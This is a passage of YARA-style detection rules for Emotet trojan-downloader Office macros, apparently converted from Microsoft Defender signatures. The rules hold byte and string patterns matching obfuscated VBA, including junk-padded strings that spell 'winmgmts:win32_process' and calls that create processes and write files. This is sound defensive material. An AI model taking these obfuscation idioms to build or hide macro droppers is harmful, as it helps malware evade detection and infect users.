        $x_1_4 = {73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 [0-32] 20 2b}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"\"" ascii //weight: 1
        $x_1_6 = ".Pages(0).Caption" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VZ_2147749908_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VZ!MTB"
        threat_id = "2147749908"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-37] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-37] 2e [0-48] 20 2b 20 [0-37] 20 2b 20 [0-37] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 4e 6f 4c 69 6e 65 42 72 65 61 6b 41 66 74 65 72 20 2b 20 [0-32] 20 2b 20 [0-16] 2c 20 [0-32] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 [0-37] 2e 5a 6f 6f 6d [0-32] 29 20 2b 20 22 [0-64] 77 [0-64] 69 [0-64] 6e [0-64] 33 [0-64] 32 [0-64] 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = {2b 20 43 68 72 57 28 [0-37] 2e 5a 6f 6f 6d [0-32] 29 20 2b 20 [0-32] 2e [0-32] 2e 54 61 67 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VX_2147749933_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VX!MTB"
        threat_id = "2147749933"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-16] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {29 20 2b 20 [0-48] 77 [0-48] 69 [0-48] 6e [0-48] 33 [0-48] 32 [0-48] 5f [0-48] 22 20 2b 20 [0-32] 2e [0-64] 72 [0-48] 6f [0-48] 63 [0-48] 65 [0-48] 73 [0-48] 73 [0-48] 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_WA_2147749951_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.WA!MTB"
        threat_id = "2147749951"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-16] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 70 6c 69 74 28 [0-21] 2c 20 22 [0-16] 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 4a 6f 69 6e 28 [0-21] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 [0-32] 20 2b}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"\"" ascii //weight: 1
        $x_1_6 = ".Pages(0).Caption" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_WB_2147749988_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.WB!MTB"
        threat_id = "2147749988"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-21] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 [0-32] 2e 5a 6f 6f 6d 20 2b 20 [0-5] 20 2b [0-6] 2b 20 [0-32] 2e [0-32] 2e 54 61 67 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AAA_2147760075_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AAA!MTB"
        threat_id = "2147760075"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 [0-32] 20 3d 20 43 68 72 28 [0-48] 2e 5a 6f 6f 6d 20 2b 20 [0-4] 20 2b 20 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 64 20 49 66 [0-32] 20 3d 20 [0-48] 2e [0-32] 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 22 22 [0-16] 20 3d 20 43 68 72 24 28 [0-3] 29 20 26}  //weight: 1, accuracy: Low
        $x_1_4 = {4c 6f 6f 70 02 00 45 6e 64 20 49 66 [0-16] 20 3d 20 [0-48] 2e [0-32] 2e 50 61 67 65 73 28 31 29 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {26 20 43 68 72 24 28 [0-3] 29 02 00 49 66}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAB_2147771863_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAB!MTB"
        threat_id = "2147771863"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ro]b2[s]b2[sce]b2[ss]b2[ss]b2[s]b2[s\"" ascii //weight: 1
        $x_1_2 = ":w]b2[s]b2[sin]b2[s3]b2[s2]b2[s_]b2[s\"" ascii //weight: 1
        $x_1_3 = "w]b2[sin]b2[sm]b2[sgm]b2[st]b2[s]b2[s\"" ascii //weight: 1
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 5d 62 32 5b 73 22 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 28 [0-32] 29 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAC_2147771871_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAC!MTB"
        threat_id = "2147771871"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-32] 20 3d 20 [0-32] 2e 53 74 6f 72 79 52 61 6e 67 65 73 2e 49 74 65 6d 28 [0-4] 20 2f 20 [0-4] 29 [0-16] 47 6f 54 6f 20 [0-21] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 46 72 65 65 46 69 6c 65 02 00 4f 70 65 6e 20 22 [0-3] 3a 5c [0-32] 5c [0-32] 5c [0-32] 2e [0-32] 22 20 46 6f 72 20 42 69 6e 61 72 79 20 41 63 63 65 73 73 20 52 65 61 64 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_3 = {4f 70 65 6e 20 22 [0-1] 3a 5c [0-32] 5c [0-32] 5c [0-32] 2e [0-32] 22 20 46 6f 72 20 42 69 6e 61 72 79 20 41 63 63 65 73 73 20 52 65 61 64 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_4 = {47 65 74 20 23 [0-32] 2c 20 2c 20 [0-16] 47 65 74 20 23 [0-32] 2c 20 2c 20 [0-16] 47 65 74 20 23 [0-32] 2c 20 2c 20 [0-16] 43 6c 6f 73 65 20 23 [0-32] 3a}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 28 [0-32] 29 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_6 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-16] 47 6f 54 6f 20 [0-21] 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAD_2147771905_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAD!MTB"
        threat_id = "2147771905"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"]e1r[Sro]e1r[S]e1r[Sce]e1r[Ss]e1r[Ss]e1r[S]e1r[S\"" ascii //weight: 1
        $x_1_2 = " = \"]e1r[S:w]e1r[S]e1r[Sin]e1r[S3]e1r[S2]e1r[S_]e1r[S\"" ascii //weight: 1
        $x_1_3 = " = \"w]e1r[Sin]e1r[Sm]e1r[Sgm]e1r[St]e1r[S]e1r[S\"" ascii //weight: 1
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 5d 65 31 72 5b 53 22 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 28 [0-32] 29 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAE_2147771909_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAE!MTB"
        threat_id = "2147771909"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 65 74 20 [0-32] 20 3d 20 [0-32] 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 [0-1] 3a 5c [0-32] 5c [0-32] 2e [0-32] 22 29 [0-32] 2e 57 72 69 74 65 4c 69 6e 65 20 22 20 22 [0-32] 2e 43 6c 6f 73 65 [0-32] 53 65 74 20 [0-32] 20 3d 20 4e 6f 74 68 69 6e 67 02 00 53 65 74 20 [0-32] 20 3d 20 4e 6f 74 68 69 6e 67 [0-32] 3a}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-32] 20 3d 20 [0-32] 2e 53 74 6f 72 79 52 61 6e 67 65 73 2e 49 74 65 6d 28 [0-3] 20 2f 20 [0-3] 29 [0-16] 47 6f 54 6f}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 4d 69 64 28 41 70 70 6c 69 63 61 74 69 6f 6e 2e 4e 61 6d 65 2c 20 [0-3] 2c 20 [0-2] 29 20 2b 20 [0-32] 47 6f 54 6f 20 [0-32] 44 69 6d 20}  //weight: 1, accuracy: Low
        $x_1_4 = {53 65 74 20 [0-32] 20 3d 20 4e 6f 74 68 69 6e 67 [0-32] 3a [0-37] 20 3d 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-37] 47 6f 54 6f 20 [0-16] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_5 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-16] 47 6f 54 6f 20 [0-32] 44 69 6d 20 [0-32] 41 73 20 4f 62 6a 65 63 74 02 00 53 65 74 20 [0-32] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 63 72 69 70 74 69 6e 67 2e 46 69 6c 65 53 79 73 74 65 6d 4f 62 6a 65 63 74 22 29}  //weight: 1, accuracy: Low
        $x_1_6 = {2e 43 72 65 61 74 65 20 [0-32] 28 [0-32] 29 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAF_2147772062_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAF!MTB"
        threat_id = "2147772062"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"]anw[3ro]anw[3]anw[3ce]anw[3s]anw[3s]anw[3]anw[3" ascii //weight: 1
        $x_1_2 = " = \"]anw[3:w]anw[3]anw[3in]anw[33]anw[32]anw[3_]anw[3" ascii //weight: 1
        $x_1_3 = " = \"w]anw[3in]anw[3m]anw[3gm]anw[3t]anw[3]anw[3" ascii //weight: 1
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 5d 61 6e 77 5b 33 22 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 28 [0-32] 29 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAG_2147772063_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAG!MTB"
        threat_id = "2147772063"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 69 6d 20 [0-32] 20 41 73 20 4f 62 6a 65 63 74 02 00 53 65 74 20 [0-32] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 63 72 22 20 2b 20 22 69 70 74 69 6e 67 2e 46 69 6c 22 20 2b 20 22 65 53 79 73 74 65 6d 22 20 2b 20 22 4f 62 6a 65 63 74 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {44 69 6d 20 [0-32] 20 41 73 20 4f 62 6a 65 63 74 02 00 53 65 74 20 [0-32] 20 3d 20 [0-32] 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 [0-1] 3a 5c [0-16] 5c [0-16] 2e [0-16] 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 57 72 69 74 65 4c 69 6e 65 20 22 [0-32] 22 [0-32] 2e 43 6c 6f 73 65 02 00 53 65 74 20 [0-32] 20 3d 20 4e 6f 74 68 69 6e 67 02 00 53 65 74 20 [0-32] 20 3d 20 4e 6f 74 68 69 6e 67 [0-32] 3a}  //weight: 1, accuracy: Low
        $x_1_4 = {53 65 74 20 [0-32] 20 3d 20 4e 6f 74 68 69 6e 67 [0-32] 3a [0-37] 20 3d 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 20 47 6f 54 6f}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 28 [0-32] 29 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAH_2147772072_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAH!MTB"
        threat_id = "2147772072"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"]an\" + \"w[3ro]anw[3]a\" + \"nw[3ce]anw[3s]anw[3s]anw[3]anw[3\"" ascii //weight: 1
        $x_1_2 = " = \"]anw[3:w]anw[3]anw[3i\" + \"n]anw[33]anw[32]anw[3_]anw[3\"" ascii //weight: 1
        $x_1_3 = " = \"w]anw[3in]anw[3m]an\" + \"w[3gm]anw[3t]anw[3]anw[3\"" ascii //weight: 1
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 5d 61 22 20 2b 20 22 6e 77 5b 33 22 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 28 [0-32] 29 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAI_2147772093_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAI!MTB"
        threat_id = "2147772093"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 65 74 20 [0-32] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-32] 28 22 5d 61 6e 77 5b 33 53 63 5d 61 6e 77 5b 33 72 69 70 74 69 5d 61 6e 77 5b 33 6e 67 2e 46 69 6c 5d 61 6e 77 5b 33 65 53 79 73 74 5d 61 6e 77 5b 33 65 6d 4f 62 5d 61 6e 77 5b 33 6a 65 63 74 5d 61 6e 77 5b 33 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 53 74 6f 72 79 52 61 6e 67 65 73 2e 49 74 65 6d 28 32 20 2f 20 32 29 20 2b 20 [0-32] 47 6f 54 6f 20 [0-21] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_3 = {53 65 74 20 [0-32] 20 3d 20 [0-32] 2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 [0-16] 3a 5c [0-16] 5c [0-16] 2e [0-16] 22 29 [0-32] 2e 57 72 69 74 65 4c 69 6e 65 20 22 [0-32] 22 [0-32] 2e 57 72 69 74 65 4c 69 6e 65 20 22 [0-32] 22 [0-32] 2e 57 72 69 74 65 4c 69 6e 65 20 22 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_4 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-16] 47 6f 54 6f 20 [0-16] 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 28 [0-32] 29 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAK_2147772431_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAK!MTB"
        threat_id = "2147772431"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"w]xm[vrow]xm[vw]xm[vcew]xm[vsw]xm[vsw]xm[vw]xm[v\"" ascii //weight: 1
        $x_1_2 = " = \"w]xm[v:ww]xm[vw]xm[vinw]xm[v3w]xm[v2w]xm[v_w]xm[v\"" ascii //weight: 1
        $x_1_3 = " = \"ww]xm[vinw]xm[vmw]xm[vgmw]xm[vtw]xm[vw]xm[v\"" ascii //weight: 1
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 77 5d 78 6d 5b 76 22 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 72 65 61 74 65 20 [0-32] 28 [0-32] 2c 20 [0-32] 2c 20 [0-32] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAM_2147772435_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAM!MTB"
        threat_id = "2147772435"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74 [0-37] 20 3d 20 [0-37] 20 3d 20 [0-32] 20 2b 20 [0-32] 2e 53 74 6f 72 79 52 61 6e 67 65 73 28 77 64 4d 61 69 6e 54 65 78 74 53 74 6f 72 79 29 20 2b 20 [0-37] 47 6f 54 6f 20 [0-21] 53 65 74}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 64 20 49 66 [0-16] 3a [0-32] 20 3d 20 22 [0-32] 3a 77 [0-32] 69 6e [0-32] 33 [0-32] 32 [0-32] 5f [0-32] 22 [0-21] 47 6f 54 6f}  //weight: 1, accuracy: Low
        $x_1_3 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 [0-32] 20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 [0-21] 22 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_4 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAN_2147772436_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAN!MTB"
        threat_id = "2147772436"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 6e 64 20 49 66 [0-21] 3a [0-32] 20 3d 20 22 [0-37] 22 [0-32] 20 3d 20 22 [0-32] 72 6f [0-32] 63 65 [0-32] 73 [0-32] 73 [0-32] 22}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 64 20 49 66 [0-21] 3a [0-32] 20 3d 20 22 [0-21] 3a 77 [0-21] 69 6e [0-21] 33 [0-21] 32 [0-21] 5f [0-21] 22}  //weight: 1, accuracy: Low
        $x_1_3 = {45 6e 64 20 49 66 [0-21] 3a [0-32] 20 3d 20 22 77 [0-21] 69 6e [0-21] 6d [0-21] 67 6d [0-21] 74 [0-21] 22}  //weight: 1, accuracy: Low
        $x_1_4 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 [0-32] 20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 [0-21] 22 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_5 = {45 6e 64 20 46 75 6e 63 74 69 6f 6e 02 00 46 75 6e 63 74 69 6f 6e 20 [0-32] 28 [0-32] 29 02 00 4f 6e 20 45 72 72 6f 72 20 52 65 73 75 6d 65 20 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAO_2147772466_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAO!MTB"
        threat_id = "2147772466"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = \"A][q[DroA][q[DA][q[DceA][q[DsA][q[DsA][q[DA][q[D\"" ascii //weight: 1
        $x_1_2 = " = \"A][q[D:wA][q[DA][q[DinA][q[D3A][q[D2A][q[D_A][q[D\"" ascii //weight: 1
        $x_1_3 = " = \"wA][q[DinA][q[DmA][q[DgmA][q[DtA][q[DA][q[D\"" ascii //weight: 1
        $x_1_4 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-32] 2c 20 22 41 5d 5b 71 5b 44 22 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_5 = "= \"A][q[DpA][q[D\"" ascii //weight: 1
        $x_1_6 = {2e 43 72 65 61 74 65 20 [0-32] 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SAR_2147772474_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SAR!MTB"
        threat_id = "2147772474"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4e 65 78 74 20 [0-37] 3a [0-32] 20 3d 20 22 [0-32] 22 [0-37] 20 3d 20 22 [0-21] 72 6f [0-32] 63 65 [0-21] 73 [0-21] 73 [0-32] 22}  //weight: 1, accuracy: Low
